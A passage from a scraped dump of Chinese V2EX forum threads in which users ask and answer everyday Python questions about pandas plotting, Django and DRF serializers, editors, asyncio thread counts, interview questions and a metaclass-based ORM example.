freq='D')\n</code></pre>\n<p>十、画图(plot)</p>\n<p>在 pycharm 中首先要： import matplotlib.pyplot as plt</p>\n<p>a=Series(np.random.randn(1000),index=pd.date_range(‘ 20100101 ’,periods=1000))</p>\n<p>b=a.cumsum()</p>\n<p>b.plot()</p>\n<p>plt.show() #最后一定要加这个 plt.show()，不然不会显示出图来。</p>\n<pre><code>import matplotlib.pyplot as plt\na=pd.Series(np.random.randn(1000),index=pd.date_range('20150101',periods=1000))\nb=a.cumsum()\nb.plot()\nplt.show()\n</code></pre>\n<img src=\"http://pic3.zhimg.com/v2-9799f5fcea0e707a1035cd3f1b7ca416_b.png\">\n<p>也可以使用下面的代码来生成多条时间序列图：</p>\n<p>a=DataFrame(np.random.randn(1000 ， 4),index=pd.date_range(‘ 20100101 ’,periods=1000),columns=list(‘ ABCD ’))</p>\n<p>b=a.cumsum()</p>\n<p>b.plot()</p>\n<p>plt.show()</p>\n<pre><code>a=pd.DataFrame(np.random.randn(1000,4),index=pd.date_range('20150101',periods=1000),columns=list('ABCD'))\nb=a.cumsum()\nb.plot()\nplt.show()\n</code></pre>\n<img src=\"http://pic1.zhimg.com/v2-3222ebaf48e69de94e7c3863a0e2eb18_b.png\">\n<h1>以上代码不想自己试一试吗？</h1>\n<p><a href=\"http://www.raquant.com/?pk_campaign=v2ex\" rel=\"nofollow\">镭矿raquant</a>提供jupyter在线练习学习python的机会，无需安装python即可运行python程序。</p>\n</div></div>"], "reply": "3", "tittle": "Python 之数据分析利器", "comment": ["图全挂了😅", " 真是见鬼，又修改不了，但是貌似右键查看图片还是可以看看。", "图片全部 403 了，什么情况？"]},
{"content": ["<div class=\"topic_content\">用 paramiko.没发现有这样的功能啊。有达人能指点下么？\r<br>\r<br>冰天雪地裸奔跪求。</div>"], "reply": "目前尚无回", "tittle": "Python 玩 SFTP，如何实现断点续传？", "comment": []},
{"content": ["<div class=\"topic_content\">写了个 function ，如何让该方法成为所有 model 的成员函数，而不是每个 model 都写一遍</div>"], "reply": "2", "tittle": "django model 扩展", "comment": ["继承呀", "把这个 function 放进一个 class 里 然后所有 model 都继承一下"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>比如</p>\n<pre><code>main.py\n\nhuman/\n    white_people.py\n\tblack_people.py\n    \nanimals/\n    cat.py\n    dog.py\n    \nlog.py\nutils.py\n</code></pre>\n<p>如果 human 里的文件和 animals 里面的文件都想用 <a href=\"http://utils.py\" rel=\"nofollow\">utils.py</a> 或者 <a href=\"http://log.py\" rel=\"nofollow\">log.py</a>,那就得向上级引用，有人说是设计不合理</p>\n<p>各位怎么处理这个问题的</p>\n</div></div>"], "reply": "9", "tittle": "关于 Python 项目结构的问题，你们的 utils.py log.py 都是怎么放的？", "comment": ["目录下需要__init__.py 文件", "看错....", " \r", "你说得没错，就是要弄成 package ，这样 submodule 之间就能互相引用了。\r", "\r", "细则参考\r", "absolute import\r", "\r", "```python\r", "# dog.py\r", "from package.log import Logger\r", "from package.utils import clean_dog_shit", "不要用相对路径，不然之后调整结构很麻烦，统一从项目根目录开始 import ，然后开发的时候把项目根目录加到 python 模块搜索路径", "忘了说了， py2 还得 \r", "from __future__ import absolute_import\r", "\r", "决策背景和最佳实践参见 PEP 328\r", "自己建了一个 libs 库", "试试 cockiecutter", "aimee/\r", "├── __init__.py\r", "├── app.py\r", "├── common  -- log\r", "├── config.py\r", "├── handlers\r", "├── model\r", "├── static\r", "└── templates"]},
{"content": ["<div class=\"topic_content\">好吧，我承认我语文不好，实在想不出来如何描述，也不知道专业术语\r<br>图片如下\r<br><a target=\"_blank\" href=\"http://zen.crosswarm.com/wp-content/uploads/2011/09/1306837663AjAJ.jpg\" rel=\"nofollow\">http://zen.crosswarm.com/wp-content/uploads/2011/09/1306837663AjAJ.jpg</a>\r<br>放大可以看到这张图片是由许多张小图片组合成的\r<br>不知道如何制作类似的图片</div>"], "reply": "4", "tittle": "如何用 Python 做出一张由许多小图片组成大图片的图片", "comment": ["感觉可以先划格子，然后算格子里面像素的方差，如果太大就接着划格子，直到方差小于某个阈值，然后在图片库里面找一张平均颜色（众数）最相近的图片填进那个格子…\r", "\r", "不知道这样做效果会如何…", "关键词： python photomosaic\r", "轮子一大堆", "pillow 自己写", "pil"]},
{"content": ["<div class=\"topic_content\">我又来问 dalao 们问题了\r<br>这几天一直在仔细看 restframework 的文档，手上也有一个项目正在写，但以前是 func_view 的，正在慢慢改成 class_view 的\r<br>\r<br>现在有个问题是关于 Serializer 的，比如说都要返回 User 信息\r<br>游客、本人以及好友可能看到的信息是不一样的\r<br>我现在的做法是通过定义一个基础 UserSerializer ，再继承它对 fields 作限制，\r<br>但是这样另一个问题是 嵌套问题， 比如 User 关联了 Profile ， Profile 也要根据身份区别返回\r<br>，这样就要分别定制一堆 Serializer 。\r<br>\r<br>另外我知道一个 HyperLinkModelSerializer ，但目前我需要返回嵌套形式的属性\r<br>\r<br>求大佬们指导啊</div>"], "reply": "7", "tittle": "不懂就要问系列， django restframework", "comment": ["在 View 里定义 queryset 的时候就做区分。\r", "if request.user.is_authenticated:\r", "    models.Post.objects.all()\r", "else:\r", "    models.Post.objects.filter(type='public').all()", "关联的，不太好处理，可以选择在 serializer 的__init__里修改这个关联 fields 的 queryset 值。", "你这个需要运行时确定返回数据， request 对象要参与数据生成的，直接重写 get_queryset 吧", "下面我用的一种方式， DRF 应该有类似的自定义机制\r", "\r", "```\r", "class UserSerializer(object):\r", "\r", "    fields = ['username', 'profile', 'is_member']\r", "\r", "    def serialize_field(self, field):\r", "        func = getattr('serialize_field_%s' % field, None)\r", "        if func:\r", "            return self.func()\r", "\r", "        return super(UserSerializer, self).serialize_field()\r", "\r", "    def serialize_field_profile(self):\r", "        return {\r", "            'private': 'private property',\r", "            'public': 'public property',\r", "        }\r", "\r", "\r", "class GuestUserSerializer(UserSerializer):\r", "    fields = ['username', 'profile']\r", "\r", "    def serialize_field_profile(self):\r", "        return {'public': 'public property'}\r", "```", " \r", "对的，我目前就用的这种方法，前两天太忙了都没上 V 站， restframework 里讲 Serializer 部分有一个就是 DynamicSerializer ，可以在生成 Serializer 时传入 fields 和 exclude 等字段", " 好的，我再看看， 前两天有些忙都没时间回复", " 这个我还没看过，一会看看~"]},
{"content": ["<div class=\"topic_content\">比如按 tab 就会快速跳出括号，花括号，引号。</div>"], "reply": "7", "tittle": "pycharm 如何设置快速跳出括号", "comment": ["我用的 minila ， fn+f 就是方向键右，或 Shift+回车到下一行，或 Ctrl+Shift+回车", "我觉得你有这个需求的时候应该尝试一下 vim 或者 pycharm 的 vim 插件了", "用过 eclipse 的 tab 有这个很好用， jetbrain 没有找到", "ctrl+}", "我是用 alt hjkl 操作光标。\r", "不过应该不需要啊，平时不是可以直接打完了参数直接换行吗。", "改键：将 right 和 left 改为 alt + l 和 alt + h ，然后就可以愉快的切换啦，原始的 left 和 right 依然可用", " 使用了 ideavim 但是设置的 vimrc 不管用，不像 linux 一样。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>一个 bug 折腾了 1,2 个小时，最后发现是三行代码的缩进问题，郁闷啊，感觉 vim 不怎么好用</p>\n</div></div>"], "reply": "71", "tittle": "求推荐一款 Linux 服务器上使用的 Python 编辑器", "comment": ["spacemacs", "gg=G", "vim 很好用啊，为什么缩进会出问题呢", "vs code 值得拥有，如果你是桌面版本。", "nano", "感觉楼主需要的是'scrooloose/syntastic'搭配 flake8", "vs code   \r", "PyCharm\r", "vim ，也许你需要一个 janus( ", "Spyder 挺好用的", "还有 vscode", "你需要游标卡尺（逃", "set formatprg=autopep8\\ \\-\r", "\r", "然后 gggqG", " 记得以前小伙伴说，网吧的电脑屏幕正中间都有一个黑点，都不知道是怎么回事。 知道有一次他在网吧玩枪战游戏，哈哈哈", "spacemacs 强推。", "emacs 或者 vs+ssh", "vscode 不折腾", "没人推 jupyter?", "vim 默认设置需要改造下 tab 行为\r", "vim ~/.vimrc\r", "```shell\r", "set tabstop=4     \" a hard TAB displays as 4 columns\r", "set expandtab     \" insert spaces when hitting TABs\r", "set softtabstop=4 \" insert/delete 4 spaces when hitting a TAB/BACKSPACE\r", "```\r", "要自动补全啥的装个插件 ", "\r", "\r", "不过还是推荐集成 ssh 的 Pycharm,同步,自动上传", "有免费的 pycharm edu 为啥不用？编辑器的话 st ， atom ， vscode ， vim ， Emacs 在 Linux 下都能跑的顺畅啊", "推荐 scite ，三个操作系统都支持", " \r", "我最近更新了 Vim8 ，用 ale 配合 flake8 ，异步检查错误，一点都不卡，很爽", "set tabstop=4", "感觉缩进都是复制粘贴", "vim\r", "PyCharm \r", "Wing IDE", "缩进是指逻辑上的还是 space/tab ？\r", "逻辑上的问题编辑器 /IDE 没办法解决吧！？\r", "关于 space/tab 的问题装个插件不就好了。", "vim", "scite +1", "试试这个呗， ", "我很好奇你们用 IDE 的如何在服务器上写代码或者换台电脑如何写代码，或者怎么高效的在办公室，家里切换环境写代码。", " 为什么要在家写代码，在家可以远程啊", "回复楼主，先编辑好，再传上去不行吗？", "用本地的编辑器远程编辑服务器上的文件,体验远远好于登录到服务器然后打开编辑器编辑.", "ssh + vim\r", "\r", "本地 vim 或者 VS code", "当然,如果远程编辑的话我推荐 spacemacs.", "Sublime", "vim", "推荐 vscode ，如果你说要在服务器现场修 bug ……推荐直接学写新简历", " 桌面版用的是 pycharm\r", "\r", " 哪个版本的 pycharm 集成有 ssh 啊，我们的是免费的 community 版，没这个功能啊\r", "\r", "\r", " 哈哈，我的用户只有 4 个，而且都是我的 employee ，所以可以任性一点", " 老板亲自改 bug ，贵司……", "neovim\r", "\r", "另外给自己的插件做广告： ", " \r", "支持 python 代码补全", "缩进问题，考虑安装 linter 插件，比如 neomake, syntastic 之类的", "本地用 pycharm 修改，再上传过去", " 你说的远程是指远程桌面吗？", " 嗯，我司是 VPN+远程", "vim + python_mode 插件", " 电商公司，老板手写 ERP 系统......", " 如果是公司重要的系统开发，只能在内网开发，外围的代码就放在公司公网 SVN 上，随时 checkout 下来开发", " \r", " \r", "都没 get 到我的点，其实最佳实践是在公司有个固定的开发机或开发服务器，然后无论何时何地，就像 @", " 说的只需要 ssh+vim ，这样就不需要体验烂到爆的远程桌面了， git/svn checkout 虽然可以同步代码，但换台电脑没有舒服的 IDE 就没法写代码了，所以又多了维护多个 IDE 环境（公司 PC ，笔记本，家里电脑）的开销，更重要的是代码调试时还是要远程到服务器，仅仅为了调试一下就 update 一下代码？呵呵", " \r", "小作坊才给直接远程服务器吧。。。正规公司都有持续集成", " 此服务器非彼服务器，算了，没法交流了", "vim 或者 pycharm+vim mode", "本地修改 /测试 /上传 吧..", "  我是在阿里云上见了一个服务器， ssh 和 xrdp 登陆上去， xrdp 上去还非常快，跟本地没什么区别。", "PyCharm", "2 楼 gg=G 正解", "sublime text3", " hi ,我也在武汉，业余做 python 爬虫私活，能否交个朋友？ cXE6MzQ3MzA1Mzk=，注明 v2ex", "  哈哈，这要不时程序员还不知道是 Base64 编码的需要解码。", " 我很少用 QQ ，你这个 QQ 号也搜索不到微信。", "neovim + neomake + pylama", "  呵呵", "人家楼主就喜欢本地写完不测试就上传怎么啦？\r", "人家楼主就喜欢在服务器上直接编辑怎么啦？\r", "人家楼主就是不喜欢 gg=G 怎么啦？\r", "人家楼主就是喜欢自己手动找 BUG 怎么啦？\r", "你们怎么那么矫情，真受不了你们", "想起我实习同事说的「这个 if 有  bug 啊」", "装个 vnc 和桌面环境吧，这种 gui 的 ide 和编辑器随便用，纯 terminal 下，你得花大量的时间去写配置和调试", " 确实是 if 有 bug", "没用过桌面版的 linuc", "你需要 YouCompleteMe 自动检查语法错误，或者更轻量易用的 Syntastic", "vim 不好用，那你去用 Emacs 啊（误\r", "vim 学习曲线特别陡而已，用多了就好用了", "set list", ":set list", "我把这个切换设置为快捷键 \\, L", "Emacs", "vs code", "pycharm 加上 ssh"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>比如，这个类似 func 的：</p>\n<pre><code>a = tf.placeholder(tf.float32)\nb = tf.placeholder(tf.float32)\nadder_node = a + b\nprint(sess.run(adder_node, {a: 3, b:4.5}))\nprint(sess.run(adder_node, {a: [1,3], b: [2, 4]}))\n</code></pre>\n<p>以及</p>\n<pre><code>add_and_triple = adder_node * 3.\nprint(sess.run(add_and_triple, {a: 3, b:4.5}))\n</code></pre>\n<p>抽象一下直接搞成经典的程序不好么 -.- （我是菜鸟不懂其中奥妙请不要拍脸……）</p>\n<pre><code>def adder_note(A, B):\n    return A+B\n</code></pre>\n<p>看上去不会简洁很多么 😂</p>\n</div></div>"], "reply": "9", "tittle": "TensorFlow 的语法看上去好别扭，为啥不用经典的程序语法？", "comment": ["后面这种没法做优化。", " 恩恩。我想肯定有原因，只是刚点开技能树第一页想来卖个萌 😆", "建议看看这篇文件就明白了 ", "我觉得纯粹是口味问题， tf 目前的写法比较和原来那帮搞符号式编程的口味， 帖主的比较符合大多数程序员的口味\r", "\r", "就像让一帮原来写函数式编程的人转到 Python 上， 他们写出来的感觉最好的代码， 肯定不和传统 Python 程序员的口味\r", "\r", "可以看看下面这个项目：\r", "\r", "\r", "两种口味都能接受啊。。酱油和醋一起上", "参差多态，这个世界才会美好\r", "所有的东西一模一样，会变得单调无趣\r", "不能接受新事物，思维会僵化", "lz 看看 hdl 估计就理解了，这和 rtl 那一套极其相似，描述数据流向\r", "\r", "忽然感觉 fpga 没白学 233", "感觉 lazy evaluate 可以更好地优化。当前的数据处理偏向于这种编程方式，便于后期的优化，比如执行绪优化，字节码生成， JIT 之类的。", " 好东西呀，谢谢，我去爬爬……"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>asyncio 不是用协程吗？我理解协程就应该是一个进程只创建一个线程，由这个线程自行调度协程，而使用 asyncio+aiohttp 时创建了 25 个线程， gevent+requests 创建了 15 个线程，这又是怎么理解？协程不就是为了节省线程切换带来的性能损耗吗？</p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><h1>modified fetch function with semaphore</h1>\n<pre><code>import random\nimport asyncio\nfrom aiohttp import ClientSession\n\nasync def fetch(url, session):\n    async with session.get(url) as response:\n        delay = response.headers.get(\"DELAY\")\n        date = response.headers.get(\"DATE\")\n        print(\"{}:{} with delay {}\".format(date, response.url, delay))\n        return await response.read()\n\n\nasync def bound_fetch(sem, url, session):\n    # Getter function with semaphore.\n    async with sem:\n        await fetch(url, session)\n</code></pre>\n<p>我在Windows上跑，在资源管理器看到创建了25个线程\nasync def run(r):\nurl = \"http://localhost:8080/{}\"\ntasks = []\n# create instance of Semaphore\nsem = asyncio.Semaphore(1000)</p>\n<pre><code>    # Create client session that will ensure we dont open new connection\n    # per each request.\n    async with ClientSession() as session:\n        for i in range(r):\n            # pass Semaphore and session to every GET request\n            task = asyncio.ensure_future(bound_fetch(sem, url.format(i), session))\n            tasks.append(task)\n\n        responses = asyncio.gather(*tasks)\n        await responses\n\nnumber = 10000\nloop = asyncio.get_event_loop()\n\nfuture = asyncio.ensure_future(run(number))\nloop.run_until_complete(future)\n</code></pre>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><h1>modified fetch function with semaphore</h1>\n<pre><code>import random\nimport asyncio\nfrom aiohttp import ClientSession\n\nasync def fetch(url, session):\n    async with session.get(url) as response:\n        delay = response.headers.get(\"DELAY\")\n        date = response.headers.get(\"DATE\")\n        print(\"{}:{} with delay {}\".format(date, response.url, delay))\n        return await response.read()\n\n\nasync def bound_fetch(sem, url, session):\n    # Getter function with semaphore.\n    async with sem:\n        await fetch(url, session)\n\n\nasync def run(r):\n    url = \"http://localhost:8080/{}\"\n    tasks = []\n    # create instance of Semaphore\n    sem = asyncio.Semaphore(1000)\n\n    # Create client session that will ensure we dont open new connection\n    # per each request.\n    async with ClientSession() as session:\n        for i in range(r):\n            # pass Semaphore and session to every GET request\n            task = asyncio.ensure_future(bound_fetch(sem, url.format(i), session))\n            tasks.append(task)\n\n        responses = asyncio.gather(*tasks)\n        await responses\n\nnumber = 10000\nloop = asyncio.get_event_loop()\n\nfuture = asyncio.ensure_future(run(number))\nloop.run_until_complete(future)\n</code></pre>\n<p>我在Windows的资源管理器看的线程数，刚才中间怎么打断了。。。</p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>gevent:</p>\n<pre><code>import gevent.monkey\ngevent.monkey.patch_socket()\n\nimport gevent\nimport urllib.request as req\nimport json\n\ndef fetch(pid):\n    response = req.urlopen('http://localhost:8080/')\n    result = response.read()\n    #json_result = json.loads(result)\n    #datetime = json_result['datetime']\n\n    print('Process %s' % (pid))\n    return result\n\ndef asynchronous():\n    threads = []\n    for i in range(1,800):\n        threads.append(gevent.spawn(fetch, i))\n    gevent.joinall(threads)\n\nprint('Asynchronous:')\nasynchronous()\n</code></pre>\n<p>gevent打了monkey patch也是创建15线程呀。。</p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>自己结帖，测试数据为：Windows下用<code>asyncio</code>跑一个<code>run_forever()</code>要开5个线程，用<code>aiohttp</code>发起请求最大创建25个线程，使用基于线程池的DNS resolver的gevent发起请求创建15个线程。而Linux（Ubuntu）下用<code>asyncio</code>跑空的事件循环只用1个线程，用<code>aiohttp</code>发起请求也只用1个线程，使用基于线程池DNS resolver的gevent创建10个线程，而在设置<code>export GEVENT_RESOLVER=ares</code>后也是只开一个线程，在Linux下的行为符合我对基于协程的异步IO的理解，而Windows下<code>ayncio</code>库为什么要创建这么多线程还是不理解，google也搜不到什么信息，望有大神告知。</p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>不对，刚再测了一下<code>aiohttp</code>发起请求还是要创建5个线程的，但也比Windows下创建少的多。。</p>\n</div></div>"], "reply": "14", "tittle": "Python 中的 asyncio+aiohttp 为什么还要创建线程", "comment": ["你从哪里看到有 25 个线程？代码贴下？", "别的不说，“ gevent+requests 创建了 15 个线程”那只能说明你根本没用对 gevent ， monkey patch 肯定没有在代码的第一行就打上", " 我用的 grequests 这个库，不知道是不是这个库也没打", " 这个库打了 monkey patch 的，难道是 Windows 的锅？", " 贴了代码，代码来自 ", " 不管别的类库打没打，你应该在你程序的第一行（！！！不是在你的 main 函数中，是程序的第一行，第一行，除了注释的第一行！！！）打上 monkey patch", "gevent 那个正常, 它的 dns resolver 默认是线程池实现, 可以通过设置 GEVENT_RESOLVER=ares 改成 c-ares 的实现", " 用 urllib 的版本有打 monkey patch ，更新了代码~", "7 楼的解释是正确的\r", "DNS queries performed through threadpool (default) or through c-ares (enabled via GEVENT_RESOLVER=ares env var).", " 好的，我换 Ubuntu 试试 c-ares", "线程池招你惹你了（\r", "另外，如果你用的是基于 IOCP 的 ProactorEventLoop ，那么线程数量可能会更多。\r", "最后，线程要用 Process Explorer 看。", " 没招我惹我：）只是想知道为什么要建立线程池，其对性能有哪些影响", "你使用的可能是个假 aio", "不开多线程怎么异步呀？"]},
{"content": ["<div class=\"topic_content\">LZ 最近面试想刷刷题，顺便也汇汇总，看看自己有哪些欠缺的地方。劳烦各位大佬了，小弟跪谢 orz 。</div>"], "reply": "25", "tittle": "一人说个 Python 面试题吧", "comment": ["直接跟面试你的人说，我刷了题了就不要问我技术问题了。", "反转二叉树", "请听题，能否接受加班 4 小时每天？能否接受单休？不行的话，我们就不面了。", "不知道有没有大佬 发一个 Java 相关面试题的 Git - -", "1.python 中的 static method 在什么情况下用？有什么好处？ class method 呢？\r", "2.python 为啥要搞个 metaclass? 使用场景？\r", "\r", "这 2 个题，基本每次都问下面试者（非实习生）。", "背一遍 The Zen of Python", "1           0 LOAD_CONST               0 (None)\r", "              3 POP_JUMP_IF_TRUE        10\r", "              6 LOAD_FAST                0 (x)\r", "              9 RETURN_VALUE        \r", "        >>   10 LOAD_GLOBAL              1 (reduce)\r", "             13 LOAD_CONST               1 (<code object <lambda> at 0x7f652fe1b030, file \"<stdin>\", line 1>)\r", "             16 MAKE_FUNCTION            0\r", "             19 LOAD_GLOBAL              2 (map)\r", "             22 LOAD_CONST               2 (<code object <lambda> at 0x7f652fe20b30, file \"<stdin>\", line 1>)\r", "             25 MAKE_FUNCTION            0\r", "             28 LOAD_GLOBAL              3 (filter)\r", "             31 LOAD_CONST               0 (None)\r", "             34 BUILD_LIST               0\r", "             37 LOAD_GLOBAL              4 (xrange)\r", "             40 LOAD_CONST               3 (10)\r", "             43 CALL_FUNCTION            1\r", "             46 GET_ITER            \r", "        >>   47 FOR_ITER                12 (to 62)\r", "             50 STORE_FAST               1 (z)\r", "             53 LOAD_FAST                1 (z)\r", "             56 LIST_APPEND              2\r", "             59 JUMP_ABSOLUTE           47\r", "        >>   62 CALL_FUNCTION            2\r", "             65 CALL_FUNCTION            2\r", "             68 CALL_FUNCTION            2\r", "             71 RETURN_VALUE        \r", "\r", "\r", "请将这段代码翻译成 python", " \r", "贵司莫非每次都是招总架构师的。 metaclass 不是面向 API 用户的，可能库作者都用得不多，那么高的抽象层级只有架构可能会用一点。", " meta class 有个笑话就是写了就有 job security 了。因为没人能接手。\r", "\r", "然后面试这个话题的作用应该是谁能看懂就不要谁。以免抢饭碗。", " #10\r", "2333333\r", "我记得以前在 SO 上看到，要用 metaclass 的情况 99% 只需要 decorator ，然而 99% 的情况可能连 decorator 都不需要。。。\r", "\r", " #8\r", "反编译字节码不过是考考基本的编译原理，看不出跟 python 有什么关系。面 java 不考 SSH 考读字节码怕是要被人骂神经病吧。", " 谁能看懂就不要谁……", "树上七个猴，地上一个猴。 \r", "请拿 Python 实现树对象，猴对象，要求树对象带可迭代接口，可迭代树上存在的猴；实现一个上树的接口，地上的猴可以上树。 \r", "如果在迭代中间，地上的猴上树，如何保证迭代的正确性，空间的低复杂度。", " 想知道回答上的比例和回答的程度怎么样？", " 这个只是一个引子，主要是去考 python 原理，比如为什么 python 要用 risc 模式，关于 python stack 保护模式是怎么实现的，问一堆如果对方都答上来了，然后你就只能....如果对方答不上来，就跟对方说没关系，来我们来写个冒泡算法吧! 233", " \r", "我只是单纯的期望招个比我强的程序员。我也不是个合格的面试官啊。", " \r", "全部答出来的 0\r", "答出来个大概（答对 30%）的比例不超过 5%", " \r", "数据并不可靠，因为样本不太多，也不太分散（水平高的很少投创业公司面试）", " 第一题还能说一下，第二题真是回答不了。。", "我面 meraki 的时候面了 minstack", " metaclass 和架构师有啥必然联系？架构师也不一定就用的到啊，只是一个知识点而已，完全不能代表技术能力。", "SO 上关于 Python 的高票答案，按顺序看就好啦。\r", "py 的内存管理， gc ； decorator ； mro ； ls 提到的 classmethod&staticmethod\r", "pythonic 的写法， trick 等\r", "都是我被问过的", "我见过的靠谱的面试都是考 智商 + 基础，代码只是顺便考考。考这种百年都用不到，但是只要不是智障随便 google 一下就能了解的知识点，这种面试官的脑回路应该很奇特", "你写 python 能有女朋友吗？", " 66666"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>下面是廖雪峰 python 教程中的编写一个简易 ORM 框架的例子，附上源代码</p>\n<pre><code>#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\n' Simple ORM using metaclass '\n\nclass Field(object):\n\n    def __init__(self, name, column_type):\n        self.name = name\n        self.column_type = column_type\n\n    def __str__(self):\n        return '&lt;%s:%s&gt;' % (self.__class__.__name__, self.name)\n\nclass StringField(Field):\n\n    def __init__(self, name):\n        super(StringField, self).__init__(name, 'varchar(100)')\n\nclass IntegerField(Field):\n\n    def __init__(self, name):\n        super(IntegerField, self).__init__(name, 'bigint')\n\nclass ModelMetaclass(type):\n\n    def __new__(cls, name, bases, attrs):\n        if name=='Model':\n            return type.__new__(cls, name, bases, attrs)\n        print('Found model: %s' % name)\n        mappings = dict()\n        for k, v in attrs.items():\n            if isinstance(v, Field):\n                print('Found mapping: %s ==&gt; %s' % (k, v))\n                mappings[k] = v\n        for k in mappings.keys():\n            attrs.pop(k)\n        attrs['__mappings__'] = mappings # 保存属性和列的映射关系\n        attrs['__table__'] = name # 假设表名和类名一致\n        return type.__new__(cls, name, bases, attrs)\n\nclass Model(dict, metaclass=ModelMetaclass):\n\n    def __init__(self, **kw):\n        super(Model, self).__init__(**kw)\n\n    def __getattr__(self, key):\n        try:\n            return self[key]\n        except KeyError:\n            raise AttributeError(r\"'Model' object has no attribute '%s'\" % key)\n\n    def __setattr__(self, key, value):\n        self[key] = value\n\n    def save(self):\n        fields = []\n        params = []\n        args = []\n        for k, v in self.__mappings__.items():\n            fields.append(v.name)\n            params.append('?')\n            args.append(getattr(self, k, None))\n        sql = 'insert into %s (%s) values (%s)' % (self.__table__, ','.join(fields), ','.join(params))\n        print('SQL: %s' % sql)\n        print('ARGS: %s' % str(args))\n\n# testing code:\n\nclass User(Model):\n    id = IntegerField('id')\n    name = StringField('username')\n    email = StringField('email')\n    password = StringField('password')\n\nu = User(id=12345, name='Michael', email='test@orm.org', password='my-pwd')\nu.save()\n</code></pre>\n<p>其中编写元类时，下面这句不太理解：</p>\n<pre><code>for k in mappings.keys():\n\tattrs.pop(k)\n</code></pre>\n<p>为什么要在找到符合条件的 key-value 对并将其放入新的字典 mapping 后，还要将这些 key-value 对从 attrs 字典中去除？\n我试验了一下，如果不这么做，最后的 ARGS 打印结果是</p>\n<pre><code>ARGS: [&lt;__main__.IntegerField object at 0x10cf63630&gt;, &lt;__main__.StringField object at 0x10cf636d8&gt;, &lt;__main__.StringField object at 0x10cf63668&gt;, &lt;__main__.StringField object at 0x10cf636a0&gt;]\n</code></pre>\n<p>而不是创建实例 u 是传入的参数的值，即</p>\n<pre><code>ARGS: ['my-pwd', 'test@orm.org', 'Michael', 12345]\n</code></pre>\n<p>按我的理解，就算不执行 pop 操作，在创建实例 u 后，当执行 u.save()到</p>\n<pre><code>args.append(getattr(self, k, None))\n</code></pre>\n<p>这一步时，实例 u 的属性应该会自动覆盖类 User 的属性，按这个道理， getattr(self,k,None)返回的应该是传入的参数的值，即 my-pwd', 'test@orm.org', 'Michael', 12345 这些。\n所以，实在没想通，到底为什么要执行元类中的 pop 操作。</p>\n</div></div>"], "reply": "17", "tittle": "深夜问道 Python 题，实在没想明白。求指点!", "comment": ["为什么要在找到符合条件的 key-value 对并将其放入新的字典 mapping 后，还要将这些 key-value 对从 attrs 字典中去除？也就是在执行下面的操作时\r", "```\r", "for k in mappings.keys():\r", "\tattrs.pop(k)\r", "```", "请看一下 dir 函数。", "如果不把这些属性从属性列表里面拿走，你访问 user.id 的时候不是就访问到 IntegerField('id') 了吗", "因为__getattr__是在__getattribute__没找到时调用的吧，而 getattr 里会调用__getattribute__去找。\r", "所以如果你不删掉的话就像 @", " 说的一样了", "Model 继承于 dict 。 dict 里键值对不等于类定义的属性。\r", "getattr 函数优先从类定义里面找， 找不到后才调用__getattr__。\r", "在__getattr__打个 log 就看出来了。", " 请问为什么 getattr 函数优先从类定义里面找呢？", " 请问，为什么 getattr 函数会先调用__getattribute__去找呢？", " \r", "用 getattr 函数或 a.b 形式访问类和对象的属性时， 先从类定义(__dict__中)获取，找不到的话则调用 __getattr__。\r", "\r", "对于 dict ， 则是另外一种机制，以键取值用 a['b']的形式。 \r", "这是两种不同的机制。 Model 类将对象 a.b 形式的操作转换为 a['b']， 想到这一点， 就不难理解了吧。", "Model 类里 self.b 和 self['b'] 是两个不同的变量。 他们保存在不同的表里。", "python ORM/metaclass 推荐看这个, \r", "\r", "一个 ppt 解决你大部分问题", " 再次请教下，说一下我的思路，希望您能帮我看下,不对的地方请指出，万分感谢！要创建 User 类，先根据元类 ModelMetaclass 来创建它。当执行元类后，如果不执行 pop 操作，此时 User 类的 attrs 即属性集合是{id: IntegerField('id') ,__mapping__:{id:  IntegerField('id') }}，这里我只是拿出 id 举个例子。然后，当创建 User 类的对象 u 时，即执行 u = User(id=12345, name='Michael', ", "', password='my-pwd')这一步，需要初始化对象就是执行__init__，因为 User 类的父类是 Model ，同时 Model 类的__init__方法是调用 dict 的__init__方法，所以初始化实例 u 时，调用的是 dict 的__init__方法，所以根据传入的参数属性就变成了字典形式{id:12345}。最后执行 u.save()，当执行到 args.append(getattr(self, k, None))时，此时就像你前面说的“用 getattr 函数或 a.b 形式访问类和对象的属性时， 先从类定义(__dict__中)获取，找不到的话则调用 __getattr__”，因为前面没有执行 pop 操作， User 类中有属性 id ，那么 getattr(self,id,None)会首先到 User 类中查找 id 对应的属性值，为 IntegerField('id')。如果前面元类中执行 pop 操作的话， getattr(id)在 User 类中找不到，就会调用__getattr__，此时执行 return self[key]，那么就返回初始化实例 u 后 key id 对应的值，即 12345.", " 还有个问题。\r", "我在这句“ u = User(id=12345, name='Michael', ", "', password='my-pwd')”后面加上“ print(dir(u))”。\r", "当在元类中不进行 pop 操作，打印结果是带有 id 即属性中是有 id 的。\r", "当在元类中进行 pop 操作，打印的结果不带 id 即属性中没有 id 。\r", "那么问题来了， dir(u)这个操作，作用是返回实例 u 的属性的吧？按我的理解，不管元类有没有 pop ，在初始化实例 u 后，实例 u 不是肯定有 id 这个属性吗？\r", "求解释，非常感谢！", " 请问为什么 如果不进行 pop 操作，就会访问到 IntegerField('id') 。\"getattr(self, k, None)\"这个代码的 getattr 是怎么调用的？不理解，希望您能详解给我讲解下。非常感谢！", " #13 ", "\r", "不去掉就叫做 usual places", " pop 之后， 原先定义的 id 没有了。 Model 类又定义了__setattr__函数， 里面把键值对存到了 dict 类的表里， 而不是 User.__dict__里， dir 函数就列不出来了。\r", "就像 dir(dict) 不能列出 dict 对象存储的键值对一样。\r", "dict 是 C 写的内置对象， 里面的键值对用哈希表存储。\r", "User.__dict__是类对象用来存储属性的一个 dict 。 而 Model 类本身继承于 dict ， 所以这里用到了两个 dict 。", " 3q 懂了！😄", " 非常感谢！懂了！😄"]},
